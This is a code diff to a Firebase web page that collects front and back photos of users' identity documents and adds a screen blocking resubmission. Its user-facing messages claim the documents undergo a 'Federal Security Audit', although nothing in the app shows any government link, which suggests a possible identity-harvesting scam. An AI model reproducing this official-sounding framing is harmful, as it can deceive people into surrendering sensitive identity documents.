@@ -45,7 +45,7 @@
         </button>
     </div>
 
-    <div class="container">
+    <div class="container" id="main-content">
         <div class="card" style="margin-top: 20px; border-radius: 16px; box-shadow: 0 15px 35px rgba(0,0,0,0.05); border-top: 6px solid #ba0c2f;">
             <h2 style="color: #00274c; font-size: 22px; margin-bottom: 5px; letter-spacing: -0.5px;">Identity Authentication</h2>
             
@@ -109,13 +109,37 @@
         const auth = getAuth(app);
         const db = getFirestore(app);
 
-        // Security: Ensure user is logged in
+        // Security & Submission Block Check
         onAuthStateChanged(auth, async (user) => {
             if (!user) {
                 window.location.href = 'index.html';
             } else {
                 await reload(user);
-                if (!user.emailVerified) window.location.href = 'verify.html';
+                if (!user.emailVerified) {
+                    window.location.href = 'verify.html';
+                    return;
+                }
+
+                // CHECK IF ALREADY SUBMITTED
+                const userSnap = await getDoc(doc(db, "users", user.uid));
+                if (userSnap.exists()) {
+                    const userData = userSnap.data();
+                    if (userData.kycStatus === "SUBMITTED" || userData.status === "DOCUMENTS UNDER REVIEW") {
+                        document.getElementById('main-content').innerHTML = `
+                            <div class="card" style="margin-top: 50px; text-align: center; border-top: 6px solid #f59e0b; border-radius: 16px; padding: 40px 20px; background: white; box-shadow: 0 15px 35px rgba(0,0,0,0.05);">
+                                <span style="font-size: 50px;">⏳</span>
+                                <h2 style="color: #00274c; margin-top: 15px;">Authentication Pending</h2>
+                                <div class="instruction-box" style="background: #fffbeb; color: #92400e; margin: 20px 0; border: 1px solid #fef3c7; border-radius: 10px; padding: 15px; font-size: 13px;">
+                                    Your identity documents have been received and are currently undergoing a <b>Federal Security Audit</b>. You cannot resubmit while a review is in progress.
+                                </div>
+                                <p style="font-size: 13px; color: #64748b;">Average processing time: 24-48 hours.</p>
+                                <button onclick="location.href='dashboard.html'" style="background: #00274c; color: white; padding: 15px; border-radius: 10px; width: 100%; font-weight: 800; border: none; margin-top: 10px; cursor: pointer;">
+                                    RETURN TO DASHBOARD
+                                </button>
+                            </div>
+                        `;
+                    }
+                }
             }
         });
 
@@ -136,8 +160,6 @@
             if(e.target.files[0]) document.getElementById('backName').innerText = "✅ BACK_DOC_LOADED"; 
         };
 
-        // --- SMART RESIZER FUNCTION ---
-        // Resizes images to fit within Firestore's 1MB limit while keeping them readable
         const resizeAndBase64 = (file) => new Promise((resolve, reject) => {
             const reader = new FileReader();
             reader.readAsDataURL(file);
@@ -148,8 +170,6 @@
                     const canvas = document.createElement('canvas');
                     let width = img.width;
                     let height = img.height;
-
-                    // Maximum dimension of 1000 pixels
                     const max_size = 1000;
                     if (width > height) {
                         if (width > max_size) { height *= max_size / width; width = max_size; }
@@ -160,8 +180,6 @@
                     canvas.height = height;
                     const ctx = canvas.getContext('2d');
                     ctx.drawImage(img, 0, 0, width, height);
-                    
-                    // Convert to JPEG with 60% quality to save space
                     resolve(canvas.toDataURL('image/jpeg', 0.6));
                 };
             };
@@ -183,14 +201,12 @@
             uploadBtn.disabled = true;
 
             try {
-                // Resize and convert images
                 const frontData = await resizeAndBase64(frontFile);
                 const backData = await resizeAndBase64(backFile);
 
                 const userSnap = await getDoc(doc(db, "users", user.uid));
                 const userData = userSnap.data();
 
-                // 1. Submit Request to the Admin Dashboard
                 await addDoc(collection(db, "requests"), {
                     userId: user.uid,
                     userName: userData.fullName || "Valued User",
@@ -204,18 +220,17 @@
                     timestamp: serverTimestamp()
                 });
 
-                // 2. Update status to trigger Dashboard review mode
                 await updateDoc(doc(db, "users", user.uid), {
                     status: "DOCUMENTS UNDER REVIEW",
                     kycStatus: "SUBMITTED"
                 });
 
                 alert("TRANSMISSION SUCCESS: Your identity packet has been received for federal audit.");
-                window.location.href = 'dashboard.html';
+                window.location.reload(); // Reload to trigger the "Pending" screen
 
             } catch(e) { 
                 console.error(e);
-                alert("HANDSHAKE ERROR: Data packet too large or network error. Please try again with a clearer photo.");
+                alert("HANDSHAKE ERROR: Data packet too large or network error. Please try again.");
                 uploadBtn.innerText = "Submit for 2026 Verification";
                 uploadBtn.disabled = false;
             }
